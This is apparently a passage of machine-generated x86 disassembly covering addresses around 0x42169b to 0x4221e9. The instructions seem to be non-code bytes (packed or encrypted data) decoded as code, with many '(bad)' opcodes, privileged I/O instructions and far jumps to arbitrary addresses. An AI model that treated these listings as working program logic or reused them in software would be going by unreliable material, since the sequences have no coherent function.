  42169b:	sub    bl,BYTE PTR ds:0x2bf67f9e
  4216a1:	xlat   BYTE PTR ds:[ebx]
  4216a2:	mov    bl,0xd6
  4216a4:	push   0xa14b9ca6
  4216a9:	and    eax,0xda66a278
  4216ae:	push   esi
  4216af:	sti    
  4216b0:	outs   dx,DWORD PTR ds:[esi]
  4216b1:	js     0x4216c9
  4216b3:	pushf  
  4216b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216b5:	inc    ebx
  4216b6:	frstor [eax+0x50]
  4216b9:	addr16 dec eax
  4216bb:	xchg   ebx,eax
  4216bc:	dec    eax
  4216bd:	sub    BYTE PTR [edi+0xdbf3],dl
	...
  421733:	add    BYTE PTR [ecx-0x587fdad1],cl
  421739:	mov    ch,BYTE PTR [ebp-0x7e7b35d1]
  42173f:	cmp    ecx,DWORD PTR [ecx+esi*1+0x65cad4c1]
  421746:	add    DWORD PTR [eax],eax
  421748:	cmc    
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR ds:0x150c625a,dh
  421751:	scas   al,BYTE PTR es:[edi]
  421752:	push   ss
  421753:	xchg   edx,eax
  421754:	pop    ss
  421755:	(bad)  
  421756:	popf   
  421757:	cdq    
  421758:	mov    WORD PTR [edx-0x328b12d7],cs
  42175e:	jecxz  0x421750
  421760:	clc    
  421761:	push   ss
  421762:	call   0x2951d5f2
  421767:	imul   ebx,DWORD PTR [eax+ebx*1],0x3285cc8f
  42176e:	pop    edx
  42176f:	rcr    ch,cl
  421771:	push   0xffffff86
  421773:	fcom   DWORD PTR [ecx]
  421775:	xchg   esp,eax
  421776:	hlt    
  421777:	add    al,dh
  421779:	jle    0x421705
  42177b:	repz sub bl,BYTE PTR [esi]
  42177e:	mov    BYTE PTR [ecx+eiz*2],dh
  421781:	scas   al,BYTE PTR es:[edi]
  421782:	pop    ecx
  421783:	inc    edi
  421784:	arpl   WORD PTR [ebx],cx
  421786:	mov    ?,WORD PTR [ebp-0x2a3b123c]
  42178c:	out    0xe1,al
  42178e:	scas   al,BYTE PTR es:[edi]
  42178f:	or     ecx,DWORD PTR [edx-0x33]
  421792:	in     al,0x86
  421794:	ja     0x421751
  421796:	icebp  
  421797:	adc    BYTE PTR [esi],ch
  421799:	inc    ebx
  42179a:	jle    0x421807
  42179c:	fcmovnu st,st(6)
  42179e:	ffreep st(1)
  4217a0:	sub    cl,BYTE PTR [ebp+0x76]
  4217a3:	stos   DWORD PTR es:[edi],eax
  4217a4:	pop    eax
  4217a5:	cld    
  4217a6:	xchg   edi,eax
  4217a7:	test   dl,al
  4217a9:	int3   
  4217aa:	je     0x4217fb
  4217ac:	ss dec ebp
  4217ae:	adc    edx,esi
  4217b0:	or     edx,ebp
  4217b2:	loopne 0x4217a4
  4217b4:	lahf   
  4217b5:	cmp    DWORD PTR [eax-0x61],eax
  4217b8:	sub    DWORD PTR [eax+esi*8],ecx
  4217bb:	into   
  4217bc:	sbb    eax,0x9f737436
  4217c1:	or     al,0x46
  4217c3:	mov    DWORD PTR [ecx+0x75afb5c2],0xeee4d802
  4217cd:	sti    
  4217ce:	sub    BYTE PTR [esi],0x67
  4217d1:	iret   
  4217d2:	(bad)  
  4217d3:	jmp    0x1cfae34
  4217d8:	in     eax,dx
  4217d9:	pop    esp
  4217da:	mov    al,es:0xc884b321
  4217e0:	sar    DWORD PTR [edi+0x67f77d6b],cl
  4217e6:	pop    esp
  4217e7:	psrlw  mm6,QWORD PTR [ebp+0x34]
  4217eb:	dec    ebx
  4217ec:	xor    BYTE PTR [ecx+0x27],cl
  4217ef:	mov    ecx,edx
  4217f1:	fcmovnbe st,st(0)
  4217f3:	loopne 0x421816
  4217f5:	xlat   BYTE PTR ds:[ebx]
  4217f6:	jg     0x421780
  4217f8:	push   edx
  4217f9:	imul   ebp,DWORD PTR [esi-0x476187a0],0x8d22d010
  421803:	repnz stc 
  421805:	(bad)
  421809:	cli    
  42180a:	cdq    
  42180b:	mov    edi,0x650ad23e
  421810:	mov    ecx,0xc1c55f14
  421815:	mov    esi,0x80f56631
  42181a:	push   edx
  42181b:	sub    al,0x65
  42181d:	call   0x6a2b589e
  421822:	and    edi,esp
  421824:	jae    0x42187f
  421826:	inc    ebx
  421827:	and    ebx,0x1e0f1aee
  42182d:	ss mov ebx,0xe119a6c2
  421833:	sbb    eax,DWORD PTR [ecx+0xf284e73]
  421839:	repnz push es
  42183b:	lods   al,BYTE PTR ds:[esi]
  42183c:	add    DWORD PTR [esi+0x1ed0f7],edi
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    esi,DWORD PTR [ebp-0x40f07e9a]
  4218c5:	add    WORD PTR [eax],ax
  4218c8:	cmc    
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    ah,dl
  4218cd:	dec    edx
  4218ce:	aad    0x74
  4218d0:	sub    bl,BYTE PTR [ecx-0x5cb4e50c]
  4218d6:	es pop ss
  4218d8:	xchg   ecx,eax
  4218d9:	mov    ds:0xe6c511c9,eax
  4218de:	data16 dec BYTE PTR [ebx+0x7bd5eaa3]
  4218e5:	aam    0x4f
  4218e7:	dec    ebx
  4218e8:	mov    dh,0xfd
  4218ea:	lahf   
  4218eb:	aas    
  4218ec:	ins    DWORD PTR es:[edi],dx
  4218ed:	xchg   esp,eax
  4218ee:	jl     0x42194e
  4218f0:	cmp    BYTE PTR [edx],bh
  4218f2:	ins    DWORD PTR es:[edi],dx
  4218f3:	adc    BYTE PTR es:[ecx-0x7b3df41d],ah
  4218fa:	add    BYTE PTR [eax+0x64428c4e],ch
  421900:	retf   0xca33
  421903:	mov    ecx,0x2fca5ace
  421908:	inc    ebp
  421909:	mov    BYTE PTR [ecx-0x69],0x26
  42190d:	out    dx,al
  42190e:	jmp    0xa93b:0xcc22eca2
  421915:	push   0xffffffef
  421917:	inc    edi
  421918:	xchg   ecx,eax
  421919:	pop    es
  42191a:	das    
  42191b:	push   esp
  42191c:	cmp    ah,BYTE PTR [edi-0x575f8507]
  421922:	push   esi
  421923:	retf   0xd584
  421926:	sti    
  421927:	cmp    al,BYTE PTR [eax-0x1ab2a171]
  42192d:	pop    es
  42192e:	jp     0x421975
  421930:	test   DWORD PTR [ebp-0x4e],edi
  421933:	push   0x689347d7
  421938:	sub    bh,BYTE PTR ds:0x56f8af5c
  42193e:	retf   
  42193f:	rcr    bh,0x85
  421942:	test   eax,0x76add667
  421947:	jae    0x421935
  421949:	sub    ebp,ebx
  42194b:	fwait
  42194c:	xor    bl,BYTE PTR [edx+0x46c0f8c9]
  421952:	sub    al,0x47
  421954:	xchg   esi,eax
  421955:	push   es
  421956:	or     BYTE PTR [esi],ah
  421958:	mov    ecx,0xe1dd2096
  42195d:	sbb    ebp,DWORD PTR [ebx+eiz*1]
  421960:	pop    ebp
  421961:	enter  0x652e,0xf6
  421965:	imul   ecx,DWORD PTR [esi+0x42821c5e],0xffffff9f
  42196c:	adc    BYTE PTR [edi+0x63],bl
  42196f:	popf   
  421970:	mov    esp,0x53b61202
  421975:	xor    ecx,eax
  421977:	jmp    0xbabe:0xdeb83c88
  42197e:	js     0x421942
  421980:	mov    edi,0x155495d2
  421985:	ds dec esi
  421987:	xchg   ebp,eax
  421988:	pushf  
  421989:	bound  ebp,QWORD PTR [ecx-0x11]
  42198c:	push   cs
  42198d:	and    al,ah
  42198f:	fdiv   DWORD PTR [ebp+0x42]
  421992:	mov    edx,0x5b08deab
  421997:	cdq    
  421998:	xlat   BYTE PTR ds:[ebx]
  421999:	fsubr  QWORD PTR [ebp+0x7c]
  42199c:	pushf  
  42199d:	iret   
  42199e:	in     eax,dx
  42199f:	hlt    
  4219a0:	sbb    BYTE PTR [edi],0x22
  4219a3:	cmp    DWORD PTR [eax-0x80],esi
  4219a6:	sub    eax,0xfe618042
  4219ab:	int    0xdb
  4219ad:	mov    gs,WORD PTR [ebp+ebx*8-0x6e]
  4219b1:	lods   al,BYTE PTR ds:[esi]
  4219b2:	enter  0x1ca6,0x92
  4219b6:	mov    esp,0xe57ecb27
  4219bb:	sub    eax,0xc35bc864
  4219c0:	inc    edi
	...
  421a31:	add    BYTE PTR [eax],al
  421a33:	add    bh,bl
  421a35:	xor    ch,BYTE PTR [edi-0x6010ed]
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x35f2f30b]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    ah,dh
  421a4d:	(bad)  
  421a4e:	repz xor edx,DWORD PTR [ebp+0x52]
  421a52:	jp     0x421a41
  421a54:	mov    BYTE PTR [esi+0x38],bh
  421a57:	sbb    edx,DWORD PTR [ebp-0x4b]
  421a5a:	outs   dx,BYTE PTR ds:[esi]
  421a5b:	lock xor al,BYTE PTR [eax-0x4aa3cb71]
  421a62:	fiadd  DWORD PTR [eax+0x1efa628e]
  421a68:	push   0xffffffef
  421a6a:	push   esp
  421a6b:	pop    ecx
  421a6c:	mov    eax,0x5cb746b7
  421a71:	arpl   WORD PTR [ebx],di
  421a73:	push   edx
  421a74:	mov    ah,0xda
  421a76:	fisub  DWORD PTR [ecx+0x757d2334]
  421a7c:	mov    BYTE PTR [ebx],bl
  421a7e:	icebp  
  421a7f:	sbb    al,0xd1
  421a81:	imul   edx,DWORD PTR [edi+edx*4],0xb9b8478
  421a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a89:	mov    al,0x83
  421a8b:	jmp    0x421a50
  421a8d:	popf   
  421a8e:	pop    eax
  421a8f:	or     al,0x28
  421a91:	or     DWORD PTR ds:0x87be2519,ebp
  421a97:	ret    
  421a98:	inc    edi
  421a99:	out    dx,al
  421a9a:	dec    esi
  421a9b:	jns    0x421ad4
  421a9d:	push   ss
  421a9e:	push   ecx
  421a9f:	xor    ebp,DWORD PTR [edx+0x5d]
  421aa2:	mov    al,0xca
  421aa4:	xor    esi,ebp
  421aa6:	mov    ecx,0xf4e357fe
  421aab:	aad    0xfc
  421aad:	adc    eax,0x5ef4389e
  421ab2:	push   ebx
  421ab3:	push   edi
  421ab4:	ret    0xbc07
  421ab7:	mov    ds:0xfab6f80f,eax
  421abc:	icebp  
  421abd:	je     0x421b22
  421abf:	jo     0x421b0b
  421ac1:	in     al,dx
  421ac2:	pushf  
  421ac3:	nop
  421ac4:	and    edi,ebp
  421ac6:	mov    eax,DWORD PTR [esp+edi*2]
  421ac9:	mov    ebx,DWORD PTR [ebx+0x31e14f6]
  421acf:	lds    esi,FWORD PTR [ecx-0x1b]
  421ad2:	or     eax,0x8387fe6
  421ad7:	shl    BYTE PTR [eax-0x2d6fde32],0x15
  421ade:	push   0xc3d5b86b
  421ae3:	adc    al,0xd
  421ae5:	mov    al,ds:0x65c6889f
  421aea:	or     al,al
  421aec:	mov    ecx,edi
  421aee:	dec    edx
  421aef:	inc    ebp
  421af0:	fcomp  DWORD PTR [esi+edi*4-0x46]
  421af4:	xor    DWORD PTR [edi],ecx
  421af6:	neg    BYTE PTR [ecx+esi*8-0xb2ea561]
  421afd:	xchg   ebx,eax
  421afe:	push   ds
  421aff:	(bad)  
  421b00:	dec    edx
  421b01:	repz lea esp,[ebp-0x671272c7]
  421b08:	ss dec ecx
  421b0a:	push   esp
  421b0b:	push   eax
  421b0c:	cli    
  421b0d:	xor    esp,0x72f5d764
  421b13:	push   0x0
  421b15:	add    al,0xb
  421b17:	fnstsw WORD PTR [esi-0x43]
  421b1a:	push   ebx
  421b1b:	push   0x28
  421b1d:	sbb    al,BYTE PTR [ebx+0x1452b3d1]
  421b23:	fwait
  421b24:	inc    ebx
  421b25:	shl    DWORD PTR [ebp+0x73302c55],1
  421b2b:	jle    0x421ac6
  421b2d:	clc    
  421b2e:	je     0x421b4d
  421b30:	ja     0x421b3b
  421b32:	mov    eax,ds:0x2b73bd68
  421b37:	push   ss
  421b38:	ja     0x421b97
  421b3a:	mov    edx,DWORD PTR ds:[ecx]
  421b3d:	mov    al,ds:0xb48737
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    eax,DWORD PTR [ebx-0x6d]
  421bc2:	pop    es
  421bc3:	mov    esp,0x168a9
  421bc8:	cmc    
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [esi],cl
  421bcd:	cmp    BYTE PTR [esi],al
  421bcf:	fwait
  421bd0:	sbb    al,0x54
  421bd2:	mov    ebp,0x79b05ce
  421bd7:	inc    edx
  421bd8:	data16 jns 0x421ba7
  421bdb:	out    0x34,al
  421bdd:	inc    eax
  421bde:	mov    dl,0xa
  421be0:	sub    DWORD PTR [eax],edi
  421be2:	jo     0x421ba7
  421be4:	mov    ds,WORD PTR [eax+eax*4-0x7646a73a]
  421beb:	sub    al,0x18
  421bed:	mov    eax,ds:0x6e88adc0
  421bf2:	je     0x421c54
  421bf4:	and    eax,0x8240aaf1
  421bf9:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  421bfb:	(bad)  
  421bfc:	push   edx
  421bfd:	adc    edi,DWORD PTR fs:[esi+0x6]
  421c01:	xchg   edi,eax
  421c02:	pop    es
  421c03:	pop    ebx
  421c04:	rcl    ebx,1
  421c06:	or     edx,esi
  421c08:	inc    edx
  421c09:	jmp    0xeaa5:0xfe489b53
  421c10:	xchg   BYTE PTR [ebp+eax*4-0x1f],bl
  421c14:	sbb    DWORD PTR [edx],ebp
  421c16:	fs and al,0x22
  421c19:	ficom  WORD PTR [ecx-0x4336eabc]
  421c1f:	mov    bh,BYTE PTR [esi+0x1f]
  421c22:	inc    edi
  421c23:	add    BYTE PTR [ecx-0x603cc4e2],bl
  421c29:	in     eax,0xc3
  421c2b:	(bad)  
  421c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c2d:	(bad)
  421c31:	and    al,0x39
  421c33:	test   eax,0x9e43ff9b
  421c38:	pusha  
  421c39:	in     eax,dx
  421c3a:	push   edi
  421c3b:	(bad)  
  421c3d:	inc    edi
  421c3e:	cmc    
  421c3f:	jp     0x421cac
  421c41:	adc    edx,eax
  421c43:	mov    dh,0x33
  421c45:	rcl    esp,1
  421c47:	aas    
  421c48:	nop
  421c49:	call   0x75e9:0x43bbc69f
  421c50:	mov    eax,ds:0xd75deed3
  421c55:	dec    eax
  421c56:	sub    eax,ebx
  421c58:	jne    0x421be0
  421c5a:	push   edi
  421c5b:	cmp    BYTE PTR [edi-0x13],0xab
  421c5f:	mov    bh,0xf2
  421c61:	push   esi
  421c62:	lock push 0x7a
  421c65:	lahf   
  421c66:	push   ebp
  421c67:	ret    
  421c68:	mov    cl,0x8d
  421c6a:	xor    ebx,eax
  421c6c:	sti    
  421c6d:	and    edx,DWORD PTR [eax+0x21]
  421c70:	fiadd  DWORD PTR [edx-0x77]
  421c73:	arpl   WORD PTR [ebp+0x91b7e4d],dx
  421c79:	outs   dx,DWORD PTR ds:[esi]
  421c7a:	adc    al,0x79
  421c7c:	or     bl,BYTE PTR [esi]
  421c7e:	dec    ebx
  421c7f:	call   0x98a2:0xe7a6d0bc
  421c86:	pusha  
  421c87:	inc    ecx
  421c88:	stos   DWORD PTR es:[edi],eax
  421c89:	inc    edi
  421c8a:	cli    
  421c8b:	out    0x80,al
  421c8d:	cmp    al,0x88
  421c8f:	inc    ebx
  421c90:	cmp    DWORD PTR [eax-0x63f5f2ba],eax
  421c96:	push   edi
  421c97:	xor    ch,dl
  421c99:	push   cs
  421c9a:	in     eax,0x67
  421c9c:	aam    0x7
  421c9e:	scas   al,BYTE PTR es:[edi]
  421c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ca0:	cmc    
  421ca1:	cld    
  421ca2:	hlt    
  421ca3:	mov    esi,0x8cf1fe63
  421ca8:	add    esi,esi
  421caa:	mov    al,ds:0xf83a797d
  421caf:	jmp    0x421c34
  421cb1:	push   ebp
  421cb2:	push   cs
  421cb3:	jmp    0xf9321bca
  421cb8:	pop    ebp
  421cb9:	in     al,0x5e
  421cbb:	pop    esp
  421cbc:	aas    
  421cbd:	xchg   ebx,eax
  421cbe:	ins    BYTE PTR es:[edi],dx
  421cbf:	cld    
  421cc0:	scas   al,BYTE PTR es:[edi]
	...
  421d31:	add    BYTE PTR [eax],al
  421d33:	add    bh,ah
  421d35:	push   ds
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	sub    eax,0x9e64294e
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    BYTE PTR [ebp+0x15501ebe],al
  421d51:	sbb    BYTE PTR [ebx-0x33],0x9a
  421d55:	repnz outs dx,DWORD PTR ds:[esi]
  421d57:	ret    
  421d58:	stc    
  421d59:	scas   al,BYTE PTR es:[edi]
  421d5a:	(bad)  
  421d5b:	stos   BYTE PTR es:[edi],al
  421d5c:	mov    eax,ds:0x86da0221
  421d61:	call   0x247ac10
  421d66:	popf   
  421d67:	sbb    eax,0xd9e28c01
  421d6c:	cdq    
  421d6d:	outs   dx,DWORD PTR ds:[esi]
  421d6e:	mov    ebp,0x11309104
  421d73:	mov    ds:0x68a7b813,al
  421d78:	les    edi,FWORD PTR [ebp-0x16]
  421d7b:	sbb    al,0x6f
  421d7d:	push   edx
  421d7e:	push   0x41cb1ae6
  421d83:	sub    BYTE PTR [esi],al
  421d85:	in     eax,0xae
  421d87:	jmp    0xc23f:0x7fc8a8bf
  421d8e:	clc    
  421d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d90:	(bad)  
  421d91:	(bad)  
  421d92:	push   ss
  421d93:	adc    BYTE PTR [edi+0x7],ah
  421d96:	mov    BYTE PTR [esi-0x1fe22bf9],dh
  421d9c:	add    BYTE PTR ss:[edx-0x1e],cl
  421da0:	jecxz  0x421e1c
  421da2:	mov    cl,0x5e
  421da4:	push   es
  421da5:	or     BYTE PTR [ecx-0x33154f43],bh
  421dab:	fst    DWORD PTR [ebx-0x72]
  421dae:	sub    BYTE PTR [esi],dh
  421db0:	div    DWORD PTR [ecx+0x7df3a3d2]
  421db6:	jp     0x421e29
  421db8:	add    DWORD PTR [ebx-0x5eb826b9],eax
  421dbe:	push   0xffffffef
  421dc0:	sub    eax,0xbdb39ee6
  421dc5:	xchg   esp,eax
  421dc6:	loope  0x421e08
  421dc8:	jb     0x421dd0
  421dca:	push   edi
  421dcb:	fcmovu st,st(4)
  421dcd:	mov    ebx,0x5bfc391c
  421dd2:	mov    bl,0xbb
  421dd4:	lods   al,BYTE PTR ds:[esi]
  421dd5:	jg     0x421da1
  421dd7:	out    0xa2,eax
  421dd9:	popf   
  421dda:	out    0x84,al
  421ddc:	mov    cl,0xc1
  421dde:	xor    BYTE PTR [ebp-0x4],0x8a
  421de2:	mov    ah,0xf9
  421de4:	ins    DWORD PTR es:[edi],dx
  421de5:	dec    ebx
  421de6:	(bad)  
  421de7:	popa   
  421de8:	call   0x158ab7f1
  421ded:	xlat   BYTE PTR ds:[ebx]
  421dee:	inc    esi
  421def:	inc    ebp
  421df0:	inc    eax
  421df1:	sub    al,0xb8
  421df3:	and    bh,ch
  421df5:	mov    eax,ds:0x5c37915a
  421dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfb:	rcl    BYTE PTR [ebp-0x4b],1
  421dfe:	or     bh,BYTE PTR [ebx+0x42]
  421e01:	fcomp  st(6)
  421e03:	stc    
  421e04:	hlt    
  421e05:	add    BYTE PTR [edi+edx*1+0x286c4f9d],al
  421e0c:	inc    ecx
  421e0d:	leave  
  421e0e:	jbe    0x421dea
  421e10:	int3   
  421e11:	mov    edi,0x28da5d83
  421e16:	imul   DWORD PTR [eax+0x1ea54783]
  421e1c:	jmp    0xf3c809cb
  421e21:	out    dx,eax
  421e22:	clc    
  421e23:	sahf   
  421e24:	adc    al,0x22
  421e26:	push   esi
  421e27:	mov    cl,BYTE PTR [esi+edi*2+0x34a98230]
  421e2e:	inc    ebx
  421e2f:	loopne 0x421dfe
  421e31:	(bad)  
  421e33:	fs call 0x56fbf135
  421e39:	sbb    edi,DWORD PTR [ebp+0x52]
  421e3c:	inc    esi
  421e3d:	sub    ah,ch
  421e3f:	and    edx,ecx
	...
  421eb1:	add    BYTE PTR [eax],al
  421eb3:	add    BYTE PTR [eax],ah
  421eb5:	xchg   edi,eax
  421eb6:	inc    edx
  421eb7:	shl    edi,cl
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421eab
  421ec1:	retf   0xd28c
  421ec4:	xchg   ebx,eax
  421ec5:	push   0x1
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [eax],bh
  421ecd:	sbb    ch,BYTE PTR [eax-0x60]
  421ed0:	fadd   st(2),st
  421ed2:	push   ecx
  421ed3:	lods   al,BYTE PTR ds:[esi]
  421ed4:	repnz mov al,BYTE PTR [ecx+eiz*1-0x5d]
  421ed9:	icebp  
  421eda:	pop    esi
  421edb:	pop    es
  421edc:	popf   
  421edd:	pusha  
  421ede:	sbb    DWORD PTR [ebp+0x525ded20],ebx
  421ee4:	mov    al,0xb3
  421ee6:	out    0x8d,al
  421ee8:	mov    al,ds:0xc41c510b
  421eed:	das    
  421eee:	sub    eax,0x7476ce3d
  421ef3:	inc    eax
  421ef4:	pop    DWORD PTR [edi]
  421ef6:	mov    dh,0xdb
  421ef8:	mov    ebp,0xb24cbb2
  421efd:	add    esp,edx
  421eff:	add    ah,BYTE PTR [esi+0x4e09e393]
  421f05:	dec    ebp
  421f06:	dec    esp
  421f07:	xchg   BYTE PTR [esi-0x2d84c0c2],ah
  421f0d:	into   
  421f0e:	stc    
  421f0f:	fdecstp 
  421f11:	fcmovu st,st(5)
  421f13:	xchg   esp,eax
  421f14:	not    BYTE PTR [esp+ebx*2]
  421f17:	push   ebp
  421f18:	push   cs
  421f19:	fwait
  421f1a:	(bad)  
  421f1b:	dec    eax
  421f1c:	loope  0x421f78
  421f1e:	mov    bl,0x23
  421f20:	inc    ecx
  421f21:	jmp    0xd62495c
  421f26:	(bad)  
  421f27:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  421f29:	inc    esp
  421f2a:	scas   al,BYTE PTR es:[edi]
  421f2b:	in     al,0x22
  421f2d:	jmp    0x133dcb80
  421f32:	out    0x72,al
  421f34:	das    
  421f35:	mov    esp,0xa0ad11a4
  421f3a:	outs   dx,DWORD PTR ds:[esi]
  421f3b:	popa   
  421f3c:	sub    al,al
  421f3e:	(bad)  
  421f3f:	mov    ch,0x6a
  421f41:	mov    ecx,0xed58fef1
  421f46:	mov    edx,DWORD PTR [edx-0x22]
  421f49:	shl    DWORD PTR [eax+0x18],0xa2
  421f4d:	frstor ds:0x7e90af9e
  421f53:	and    DWORD PTR [eax+0x5cc2e5f0],edx
  421f59:	jae    0x421fbd
  421f5b:	sub    ch,BYTE PTR [esi+0x4e]
  421f5e:	(bad)  
  421f5f:	and    DWORD PTR [bp-0x37],esp
  421f63:	dec    eax
  421f64:	pop    esp
  421f65:	xchg   esp,eax
  421f66:	sbb    al,0xe7
  421f68:	out    0xb8,eax
  421f6a:	adc    DWORD PTR [esi],ebp
  421f6c:	cwd    
  421f6e:	fsub   DWORD PTR [ebx-0x26]
  421f71:	bound  edx,QWORD PTR [edi]
  421f73:	adc    DWORD PTR [ebx+0x3ae6c45c],edi
  421f79:	test   eax,0x25d7e372
  421f7e:	gs inc ecx
  421f80:	push   edi
  421f81:	scas   al,BYTE PTR es:[edi]
  421f82:	xchg   ebp,eax
  421f83:	mov    ebx,0x97ad5eb8
  421f88:	or     edx,DWORD PTR [edi]
  421f8a:	jecxz  0x421f7f
  421f8c:	xchg   esi,eax
  421f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f8e:	dec    ebx
  421f8f:	lods   eax,DWORD PTR ds:[esi]
  421f90:	mov    eax,ds:0x1e7ac403
  421f95:	xchg   ecx,eax
  421f96:	fsub   QWORD PTR [edx-0x69]
  421f99:	ins    BYTE PTR es:[edi],dx
  421f9a:	data16 test bh,bl
  421f9d:	stos   BYTE PTR es:[edi],al
  421f9e:	cmp    DWORD PTR [eax],ecx
  421fa0:	sbb    al,0x21
  421fa2:	es mov cl,0x9d
  421fa5:	fnstcw WORD PTR [eax+0x3d4e5414]
  421fab:	push   edx
  421fac:	aas    
  421fad:	out    dx,al
  421fae:	adc    al,0xbd
  421fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fb1:	pop    ds
  421fb2:	add    bh,al
  421fb4:	dec    edx
  421fb5:	bound  ebp,QWORD PTR [ecx+0x69]
  421fb8:	adc    ebx,ebp
  421fba:	call   0x58ce:0x7adc020
	...
  422031:	add    BYTE PTR [eax],al
  422033:	add    BYTE PTR [edi-0x243925a2],bl
  422039:	(bad)  
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0xc821867e
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR [ebp+ecx*1+0x10290228],ch
  422052:	push   ss
  422053:	jp     0x422061
  422055:	int3   
  422056:	jmp    0xe5de:0xeb1cb631
  42205d:	xor    eax,0xc196abdd
  422062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422063:	aad    0x4
  422065:	adc    BYTE PTR [eax],0xb5
  422068:	or     al,0x7a
  42206a:	push   ss
  42206b:	mov    eax,0x2b780e5d
  422070:	mov    bh,0xa1
  422072:	pop    ecx
  422073:	popa   
  422074:	mov    fs,ebx
  422076:	sub    dl,BYTE PTR [edx+0x21e689ac]
  42207c:	ins    DWORD PTR es:[edi],dx
  42207d:	cmp    al,0xb5
  42207f:	push   0xa4aada5a
  422084:	jmp    0xfad:0x63fb2f38
  42208b:	out    dx,eax
  42208c:	dec    edi
  42208d:	pop    es
  42208e:	mov    ds:0xec16e066,eax
  422093:	push   edi
  422094:	mov    eax,0x28a960ac
  422099:	sub    al,0x23
  42209b:	push   es
  42209c:	pop    edi
  42209d:	sti    
  42209e:	outs   dx,DWORD PTR ds:[esi]
  42209f:	js     0x4220a3
  4220a1:	inc    ebp
  4220a3:	daa    
  4220a4:	adc    BYTE PTR [ebp+ecx*4-0x39],dl
  4220a8:	fdiv   st(2),st
  4220aa:	es aaa 
  4220ac:	dec    ecx
  4220ad:	and    al,0xd
  4220af:	dec    ecx
  4220b0:	inc    ebp
  4220b1:	add    eax,0x7eec4056
  4220b6:	int3   
  4220b7:	pop    ecx
  4220b8:	mov    ebx,0x6d020122
  4220bd:	aaa    
  4220be:	inc    esp
  4220bf:	sub    al,BYTE PTR [ecx]
  4220c1:	mov    ch,0xa6
  4220c3:	daa    
  4220c4:	pop    esi
  4220c5:	adc    ch,BYTE PTR [ebx]
  4220c7:	pop    ebx
  4220c8:	jecxz  0x4220fa
  4220ca:	mov    edi,0x95c0fa36
  4220cf:	or     bl,BYTE PTR [esp+edx*8+0x73]
  4220d3:	mov    al,ds:0xa2071d00
  4220d8:	mov    ch,0xfd
  4220da:	mov    eax,0x229ad24
  4220df:	je     0x422154
  4220e1:	sbb    ebx,edx
  4220e3:	pop    edx
  4220e4:	rol    DWORD PTR [ecx-0x635447b8],0xc0
  4220eb:	lock aas 
  4220ed:	dec    ebx
  4220ee:	mov    ebp,0xce831e34
  4220f3:	add    DWORD PTR ds:0x447d5f49,ebx
  4220f9:	stc    
  4220fa:	jo     0x422153
  4220fc:	jo     0x422174
  4220fe:	jmp    0x2e3acf93
  422103:	shr    BYTE PTR [ebp-0x1c],0xc7
  422107:	in     eax,dx
  422108:	add    ebp,DWORD PTR [esi+0x11]
  42210b:	bound  ecx,QWORD PTR [ebp+0x4830a499]
  422111:	inc    ebp
  422112:	fnstenv [ecx-0x7126af04]
  422118:	sub    ebp,DWORD PTR [ecx]
  42211a:	imul   ebx,DWORD PTR [edi-0x430d4522],0x92273b33
  422124:	or     bh,bl
  422126:	or     bl,BYTE PTR [edi]
  422128:	jmp    0xa386e971
  42212d:	hlt    
  42212e:	int3   
  42212f:	ror    eax,cl
  422131:	mov    ebp,0xd04dedf1
  422136:	clc    
  422137:	out    dx,eax
  422138:	inc    edi
  422139:	mul    BYTE PTR [ebx]
  42213b:	jp     0x42219a
  42213d:	ret    
  42213e:	xchg   edi,eax
  42213f:	mov    edi,0x35
	...
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0xe0d52766
  4221c1:	iret   
  4221c2:	jbe    0x422145
  4221c4:	jge    0x422232
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	cmc    
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [edx-0x55766a61],ah
  4221d1:	xchg   esp,eax
  4221d2:	mov    ecx,0x930ac749
  4221d7:	jl     0x42224a
  4221d9:	sub    ecx,eax
  4221db:	push   ecx
  4221dc:	out    dx,al
  4221dd:	fisubr WORD PTR [ebx]
  4221df:	dec    eax
  4221e0:	and    edx,DWORD PTR [ebx+0x27]
  4221e3:	mov    al,ds:0x540860b4
  4221e8:	xchg   edi,eax
  4221e9:	push   0x224d919
